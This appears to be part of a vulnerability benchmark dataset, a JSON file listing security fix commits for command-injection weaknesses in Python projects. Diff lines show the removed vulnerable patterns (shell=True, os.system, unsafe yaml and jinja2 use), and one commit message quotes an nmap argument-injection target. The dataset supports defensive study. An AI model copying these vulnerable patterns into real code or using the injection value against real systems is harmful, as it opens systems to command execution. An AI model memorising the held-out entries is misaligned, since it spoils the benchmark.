+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:savon-noir/python-libnmap",
+      "pair_id": "pyvul-savon-noir-python-libnmap-c36fecde9001",
+      "split": "development",
+      "cwe": "CWE-88",
+      "repository": "savon-noir/python-libnmap",
+      "fix_commit": "c36fecde90017befeb4853396d0e2aac93c95b64",
+      "commit": {
+        "url": "https://github.com/savon-noir/python-libnmap/commit/c36fecde90017befeb4853396d0e2aac93c95b64",
+        "message": "Fix CVE-2022-30284 by validating targets\n\nThis change adds an extra validation to `NmapProcess` that does\nsome basic checks on the `targets` parameter.\n\nIt checks that no unexpected characters are present in each target,\nand that if dashes are present, they are not located at the start\nor end of the string (a valid FQDN can have dashes except in those\npositions).\n\nThis last check fixes CVE-2022-30284, which allowed to inject\nextra command line options by using a target such as\n`127.0.0.1,--script,http-fetch....`.",
+        "files": [
+          {
+            "file": "libnmap/process.py",
+            "hits": [
+              " import shlex",
+              " import subprocess",
+              "+        for target in self.__nmap_targets:",
+              "         self._nmap_options = set(options.split())",
+              "         if safe_mode and not self._nmap_options.isdisjoint(unsafe_opts):",
+              "@@ -480,6 +484,27 @@ def __build_windows_cmdline(self):",
+              "             cmdline += self.__nmap_targets  # already a list",
+              "         return cmdline",
+              "+        # See https://nmap.org/book/man-target-specification.html for all the",
+              "     def command(self):"
+            ]
+          },
+          {
+            "file": "libnmap/test/test_process.py",
+            "hits": [
+              "             nmapobj = NmapProcess(targets=vtarget[\"value\"], options=\"-sP\")",
+              "             self.assertEqual(vtarget[\"size\"], len(nmapobj.targets))",
+              "+                NmapProcess,",
+              "+                NmapProcess,",
+              "     def test_nmap_options(self):"
+            ]
+          }
+        ],
+        "all_files": [
+          "libnmap/process.py",
+          "libnmap/test/test_process.py"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:ray-project/ray",
+      "pair_id": "pyvul-ray-project-ray-193ff8c80067",
+      "split": "development",
+      "cwe": "CWE-78",
+      "repository": "ray-project/ray",
+      "fix_commit": "193ff8c80067aed4037755cc10f15eb6986dfe95",
+      "commit": {
+        "url": "https://github.com/ray-project/ray/commit/193ff8c80067aed4037755cc10f15eb6986dfe95",
+        "message": "[Profiler] Use Exec to avoid templating issues. (#39019)\n\nCleans up profiler to always use the actual `py-spy` path. This PR also uses a list of arguments to pass to subprocess, instead of a string. Finally, this PR ensures that format is one of the expected types.",
+        "files": [
+          {
+            "file": "dashboard/modules/reporter/profile_manager.py",
+            "hits": [
+              " import subprocess",
+              "@@ -49,11 +50,12 @@ def _format_failed_pyspy_command(cmd, stdout, stderr) -> str:",
+              "-    process = await asyncio.create_subprocess_shell(",
+              "+    process = await asyncio.create_subprocess_exec(",
+              "         stdout=subprocess.PIPE,",
+              "         stderr=subprocess.PIPE,",
+              "-        shell=True,",
+              "-        cmd = f\"py-spy dump -p {pid}\"",
+              "+        cmd = [pyspy, \"dump\", \"-p\", str(pid)]",
+              "-            cmd += \" --native\"",
+              "+            cmd.append(\"--native\")",
+              "-            cmd = \"sudo -n \" + cmd.replace(\"py-spy\", \"$(which py-spy)\")",
+              "-        process = await asyncio.create_subprocess_shell(",
+              "-            cmd,",
+              "+            cmd = [\"sudo\", \"-n\"] + cmd",
+              "+        process = await asyncio.create_subprocess_exec(",
+              "+            *cmd,",
+              "             stdout=subprocess.PIPE,",
+              "             stderr=subprocess.PIPE,",
+              "-            shell=True,",
+              "-        cmd = (",
+              "+        cmd = [",
+              "-            cmd += \" --native\"",
+              "+            cmd.append(\"--native\")",
+              "-            cmd = \"sudo -n \" + cmd.replace(\"py-spy\", \"$(which py-spy)\")",
+              "-        process = await asyncio.create_subprocess_shell(",
+              "-            cmd,",
+              "+            cmd = [\"sudo\", \"-n\"] + cmd",
+              "+        process = await asyncio.create_subprocess_exec(",
+              "+            *cmd,",
+              "             stdout=subprocess.PIPE,",
+              "             stderr=subprocess.PIPE,",
+              "-            shell=True,"
+            ]
+          }
+        ],
+        "all_files": [
+          "dashboard/modules/reporter/profile_manager.py"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:huggingface/transformers",
+      "pair_id": "pyvul-huggingface-transformers-2272ab57a99b",
+      "split": "development",
+      "cwe": "CWE-78",
+      "repository": "huggingface/transformers",
+      "fix_commit": "2272ab57a99bcac972b5252b87c31e24d0b25538",
+      "commit": {
+        "url": "https://github.com/huggingface/transformers/commit/2272ab57a99bcac972b5252b87c31e24d0b25538",
+        "message": "Remove shell=True from subprocess.Popen to Mitigate Security Risk (#28299)\n\nRemove shell=True from subprocess.Popen to mitigate security risk",
+        "files": [
+          {
+            "file": "src/transformers/onnx/__main__.py",
+            "hits": [
+              "-    proc = subprocess.Popen(\" \".join(cmd_line), stdout=subprocess.PIPE, shell=True)",
+              "+    proc = subprocess.Popen(cmd_line, stdout=subprocess.PIPE)"
+            ]
+          }
+        ],
+        "all_files": [
+          "src/transformers/onnx/__main__.py"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:abilian/abilian-devtools",
+      "pair_id": "pyvul-abilian-abilian-devtools-9d71b0d3b6b4",
+      "split": "held_out",
+      "cwe": "CWE-78",
+      "repository": "abilian/abilian-devtools",
+      "fix_commit": "9d71b0d3b6b467589d58aacc932ca3dc7e524ce2",
+      "commit": {
+        "url": "https://github.com/abilian/abilian-devtools/commit/9d71b0d3b6b467589d58aacc932ca3dc7e524ce2",
+        "message": "refact: more secure.",
+        "files": [
+          {
+            "file": "Makefile",
+            "hits": [
+              "@@ -45,76 +45,18 @@ clean-test: ## remove test and coverage artifacts"
+            ]
+          },
+          {
+            "file": "src/abilian/devtools/main.py",
+            "hits": [
+              "+import shlex",
+              "+import subprocess",
+              " def run(cmd):",
+              "     typer.secho(cmd, fg=typer.colors.GREEN)",
+              "-    result = os.system(cmd)",
+              "+    args = shlex.split(cmd)",
+              "+    p = subprocess.Popen(args)",
+              "-    Abilian Dev Tool command-line runner.",
+              "+    \"\"\"Abilian Dev Tool command-line runner.\"\"\""
+            ]
+          }
+        ],
+        "all_files": [
+          "Makefile",
+          "pyproject.toml",
+          "src/abilian/devtools/main.py"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:cyanomiko/dcnnt-py",
+      "pair_id": "pyvul-cyanomiko-dcnnt-py-b4021d784a97",
+      "split": "held_out",
+      "cwe": "CWE-78",
+      "repository": "cyanomiko/dcnnt-py",
+      "fix_commit": "b4021d784a97e25151a5353aa763a741e9a148f5",
+      "commit": {
+        "url": "https://github.com/cyanomiko/dcnnt-py/commit/b4021d784a97e25151a5353aa763a741e9a148f5",
+        "message": "Fix command ijection vulnerability\n\nFix passing of unescaped text to the arguments of notification command\nin dcnnt/plugins/notifications.py\n\nThis is a high-risk vulnerability that can lead to RCE and allow arbitrary code\nexecution on the server while the notification showing.\n\nAll text received over the network MUST be escaped before being transmitted to\nthe database or to the shell command arguments.",
+        "files": [
+          {
+            "file": "dcnnt/plugins/notifications.py",
+            "hits": [
+              " import subprocess",
+              "+from shlex import quote",
+              "-                    command = cmd.format(uin=uin, name=name, icon=icon, text=text, title=title, package=package)",
+              "+                    command = cmd.format(uin=quote(uin), name=quote(name), icon=quote(icon), text=quote(text), title=quote(title), package=quote(package))",
+              "                     self.log('Execute: \"{}\"'.format(command))",
+              "                     subprocess.call(command, shell=True)"
+            ]
+          }
+        ],
+        "all_files": [
+          "dcnnt/plugins/notifications.py"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:mlflow/mlflow",
+      "pair_id": "pyvul-mlflow-mlflow-802911381717",
+      "split": "held_out",
+      "cwe": "CWE-77",
+      "repository": "mlflow/mlflow",
+      "fix_commit": "8029113817175cc9b9bed5c1bebe2f9afea2835b",
+      "commit": {
+        "url": "https://github.com/mlflow/mlflow/commit/8029113817175cc9b9bed5c1bebe2f9afea2835b",
+        "message": "Add sandboxed jinja2 loader for yaml rendering (#10676)\n\nSigned-off-by: Ben Wilson <benjamin.wilson@databricks.com>",
+        "files": [
+          {
+            "file": "mlflow/utils/file_utils.py",
+            "hits": [
+              "@@ -329,7 +329,8 @@ def render_and_merge_yaml(root, template_name, context_name):",
+              "-    import jinja2",
+              "+    from jinja2 import FileSystemLoader, StrictUndefined",
+              "+    from jinja2.sandbox import SandboxedEnvironment",
+              "     template_path = os.path.join(root, template_name)",
+              "@@ -338,9 +339,9 @@ def render_and_merge_yaml(root, template_name, context_name):",
+              "-    j2_env = jinja2.Environment(",
+              "-        loader=jinja2.FileSystemLoader(root, encoding=ENCODING),",
+              "-        undefined=jinja2.StrictUndefined,"
+            ]
+          }
+        ],
+        "all_files": [
+          "mlflow/utils/file_utils.py"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:ansible/ansible",
+      "pair_id": "pyvul-ansible-ansible-03aff644cc1c",
+      "split": "development",
+      "cwe": "CWE-78",
+      "repository": "ansible/ansible",
+      "fix_commit": "03aff644cc1c00e1f7551195c68fbd0d13a39e6e",
+      "commit": {
+        "url": "https://github.com/ansible/ansible/commit/03aff644cc1c00e1f7551195c68fbd0d13a39e6e",
+        "message": "fix unsafe preservation across newlines (#74960) (#74973)\n\n  CVE-2021-3583\r\n  ensure we always have unsafe\r\n\r\nCo-authored-by: Rick Elrod <rick@elrod.me>\r\n(cherry picked from commit 4c8c40fd3d4a58defdc80e7d22aa8d26b731353e)",
+        "files": [
+          {
+            "file": "lib/ansible/template/__init__.py",
+            "hits": [
+              "@@ -1092,7 +1092,8 @@ def do_template(self, data, preserve_trailing_newlines=True, escape_backslashes=",
+              "@@ -1122,6 +1123,8 @@ def do_template(self, data, preserve_trailing_newlines=True, escape_backslashes="
+            ]
+          },
+          {
+            "file": "test/integration/targets/template/unsafe.yml",
+            "hits": [
+              "+  gather_facts: false",
+              "+    nottemplated: this should not be seen",
+              "+    imunsafe: !unsafe '{{ nottemplated }}'",
+              "+    - name: ensure nothing was templated"
+            ]
+          }
+        ],
+        "all_files": [
+          "changelogs/fragments/fix_unsafe_newline.yml",
+          "lib/ansible/template/__init__.py",
+          "test/integration/targets/template/runme.sh",
+          "test/integration/targets/template/unsafe.yml"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:ansible/ansible",
+      "pair_id": "pyvul-ansible-ansible-4c8c40fd3d4a",
+      "split": "development",
+      "cwe": "CWE-78",
+      "repository": "ansible/ansible",
+      "fix_commit": "4c8c40fd3d4a58defdc80e7d22aa8d26b731353e",
+      "commit": {
+        "url": "https://github.com/ansible/ansible/commit/4c8c40fd3d4a58defdc80e7d22aa8d26b731353e",
+        "message": "fix unsafe preservation across newlines (#74960)\n\n* fix unsafe preservation across newlines\r\n\r\n  CVE-2021-3583\r\n  ensure we always have unsafe\r\n\r\nCo-authored-by: Rick Elrod <rick@elrod.me>",
+        "files": [
+          {
+            "file": "lib/ansible/template/__init__.py",
+            "hits": [
+              "@@ -1114,7 +1114,8 @@ def do_template(self, data, preserve_trailing_newlines=True, escape_backslashes=",
+              "@@ -1144,6 +1145,8 @@ def do_template(self, data, preserve_trailing_newlines=True, escape_backslashes="
+            ]
+          },
+          {
+            "file": "test/integration/targets/template/unsafe.yml",
+            "hits": [
+              "+  gather_facts: false",
+              "+    nottemplated: this should not be seen",
+              "+    imunsafe: !unsafe '{{ nottemplated }}'",
+              "+    - name: ensure nothing was templated"
+            ]
+          }
+        ],
+        "all_files": [
+          "changelogs/fragments/fix_unsafe_newline.yml",
+          "lib/ansible/template/__init__.py",
+          "test/integration/targets/template/runme.sh",
+          "test/integration/targets/template/unsafe.yml"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:ansible/ansible",
+      "pair_id": "pyvul-ansible-ansible-8aa850e3573e",
+      "split": "development",
+      "cwe": "CWE-78",
+      "repository": "ansible/ansible",
+      "fix_commit": "8aa850e3573e48c9a2f12aef84e8a3a6f5ba4847",
+      "commit": {
+        "url": "https://github.com/ansible/ansible/commit/8aa850e3573e48c9a2f12aef84e8a3a6f5ba4847",
+        "message": "fix unsafe preservation across newlines (#74960) (#74975)\n\n  CVE-2021-3583\r\n  ensure we always have unsafe\r\n\r\nCo-authored-by: Rick Elrod <rick@elrod.me>\r\n(cherry picked from commit 4c8c40fd3d4a58defdc80e7d22aa8d26b731353e)",
+        "files": [
+          {
+            "file": "lib/ansible/template/__init__.py",
+            "hits": [
+              "@@ -1064,7 +1064,8 @@ def do_template(self, data, preserve_trailing_newlines=True, escape_backslashes=",
+              "@@ -1094,6 +1095,8 @@ def do_template(self, data, preserve_trailing_newlines=True, escape_backslashes="
+            ]
+          },
+          {
+            "file": "test/integration/targets/template/unsafe.yml",
+            "hits": [
+              "+  gather_facts: false",
+              "+    nottemplated: this should not be seen",
+              "+    imunsafe: !unsafe '{{ nottemplated }}'",
+              "+    - name: ensure nothing was templated"
+            ]
+          }
+        ],
+        "all_files": [
+          "changelogs/fragments/fix_unsafe_newline.yml",
+          "lib/ansible/template/__init__.py",
+          "test/integration/targets/template/runme.sh",
+          "test/integration/targets/template/unsafe.yml"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:ansible/ansible",
+      "pair_id": "pyvul-ansible-ansible-8b17e5b9229f",
+      "split": "development",
+      "cwe": "CWE-78",
+      "repository": "ansible/ansible",
+      "fix_commit": "8b17e5b9229ffaecfe10a4881bc3f87dd2c184e1",
+      "commit": {
+        "url": "https://github.com/ansible/ansible/commit/8b17e5b9229ffaecfe10a4881bc3f87dd2c184e1",
+        "message": "fix unsafe preservation across newlines (#74960) (#74976)\n\n  CVE-2021-3583\r\n  ensure we always have unsafe\r\n\r\nCo-authored-by: Rick Elrod <rick@elrod.me>\r\n(cherry picked from commit 4c8c40fd3d4a58defdc80e7d22aa8d26b731353e)",
+        "files": [
+          {
+            "file": "lib/ansible/template/__init__.py",
+            "hits": [
+              "@@ -875,7 +875,8 @@ def do_template(self, data, preserve_trailing_newlines=True, escape_backslashes=",
+              "@@ -905,6 +906,8 @@ def do_template(self, data, preserve_trailing_newlines=True, escape_backslashes="
+            ]
+          },
+          {
+            "file": "test/integration/targets/template/unsafe.yml",
+            "hits": [
+              "+  gather_facts: false",
+              "+    nottemplated: this should not be seen",
+              "+    imunsafe: !unsafe '{{ nottemplated }}'",
+              "+    - name: ensure nothing was templated"
+            ]
+          }
+        ],
+        "all_files": [
+          "changelogs/fragments/fix_unsafe_newline.yml",
+          "lib/ansible/template/__init__.py",
+          "test/integration/targets/template/runme.sh",
+          "test/integration/targets/template/unsafe.yml"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:pgadmin-org/pgadmin4",
+      "pair_id": "pyvul-pgadmin-org-pgadmin4-35f05e49b363",
+      "split": "development",
+      "cwe": "CWE-78",
+      "repository": "pgadmin-org/pgadmin4",
+      "fix_commit": "35f05e49b3632a0a674b9b36535a7fe2d93dd0c2",
+      "commit": {
+        "url": "https://github.com/pgadmin-org/pgadmin4/commit/35f05e49b3632a0a674b9b36535a7fe2d93dd0c2",
+        "message": "Fix the security issue of validate bin path to consider and fix more scenarios. #6763",
+        "files": [
+          {
+            "file": "web/pgadmin/misc/__init__.py",
+            "hits": [
+              " from flask import url_for, render_template, Response, request, current_app",
+              "-                # escape double quotes to avoid command injection.",
+              "-                # Get the output of the '--version' command",
+              "-                    subprocess.getoutput(r'\"{0}\" --version'.format("
+            ]
+          },
+          {
+            "file": "web/pgadmin/utils/__init__.py",
+            "hits": [
+              "+            # Get the output of the '--version' command",
+              "+            cmd = subprocess.run(",
+              "+                shell=False,",
+              "+            if cmd.returncode == 0:",
+              "+                ret[utility] = cmd.stdout.split(\") \", 1)[1].strip()",
+              "-                # Get the output of the '--version' command",
+              "-                    subprocess.getoutput('\"{0}\" --version'.format(full_path))"
+            ]
+          }
+        ],
+        "all_files": [
+          "web/pgadmin/misc/__init__.py",
+          "web/pgadmin/utils/__init__.py"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:autogluon/autogluon",
+      "pair_id": "pyvul-autogluon-autogluon-23a37e74e58d",
+      "split": "held_out",
+      "cwe": "CWE-78",
+      "repository": "autogluon/autogluon",
+      "fix_commit": "23a37e74e58d03055c84a1b89c5af6c3db296b5e",
+      "commit": {
+        "url": "https://github.com/autogluon/autogluon/commit/23a37e74e58d03055c84a1b89c5af6c3db296b5e",
+        "message": "[Security] load --> safe_load (#1987)\n\n* load --> safe_load\n\n* retrigger ci\n\n* Update setup.py\n\n* fix for fairscale\n\n* up-pin fairscale version\n\n* Update test_core.sh\n\n(cherry picked from commit 5f4bb240abaf58959ae74ab4b318450143a90ef4)",
+        "files": [
+          {
+            "file": "multimodal/src/autogluon/multimodal/predictor.py",
+            "hits": [
+              "-                best_k_models = yaml.load(f, Loader=yaml.Loader)"
+            ]
+          }
+        ],
+        "all_files": [
+          ".github/workflow_scripts/test_core.sh",
+          "core/setup.py",
+          "multimodal/setup.py",
+          "multimodal/src/autogluon/multimodal/predictor.py"
+        ]
+      }
+    }
+  ]
+}
